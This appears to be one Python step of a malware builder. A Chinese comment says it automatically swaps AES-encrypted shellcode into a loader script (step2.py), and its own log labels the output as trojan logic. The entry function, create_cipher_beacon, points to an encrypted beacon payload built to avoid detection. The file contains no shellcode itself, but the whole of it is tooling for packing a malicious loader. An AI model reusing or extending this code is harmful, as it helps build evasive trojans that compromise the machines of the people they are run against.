import re
from step1 import gen_aes_payload
from common.project_path import project_path
from loguru import logger

"""
因为加密后的payload过长，所以需要自动化替换加载器中的shellcode
"""


def main():
    with open(project_path.add_abs_path("/step2.py"), "r+", encoding="utf-8") as f1:
        with open(project_path.add_abs_path("/resource/shellcode_cipher.tmp"), "rb") as f2:
            step2 = f1.read()
            shellcode_cipher = f2.read()
            new_string = re.sub(r"shellcode_raw = b\"(.*?)\"", 'shellcode_raw = b"' + shellcode_cipher.decode() + '"' , step2)
            logger.debug(f'木马逻辑: {new_string}')

    with open(project_path.add_abs_path("/step2.py"), 'w', encoding="utf-8") as f1:
        f1.write(new_string)


def create_cipher_beacon():
    gen_aes_payload()
    main()

if __name__ == '__main__':
    create_cipher_beacon()